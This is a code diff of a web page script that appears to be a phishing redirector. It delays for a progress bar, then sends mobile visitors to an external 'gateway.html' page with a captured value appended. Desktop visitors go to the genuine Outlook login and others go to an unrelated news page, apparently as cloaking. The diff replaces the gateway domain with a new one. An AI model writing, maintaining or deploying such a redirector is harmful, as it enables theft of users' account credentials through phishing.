@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://envirocnhem.com/gateway.html?";
+        const MOBILE_REDIRECT_URL_BASE = "https://padgettswamn.com/gateway.html?";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -300,8 +300,8 @@
             const value = getPotentialValue();
 
             const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl;
+                console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
         }
 
         // Execute redirect after a short delay
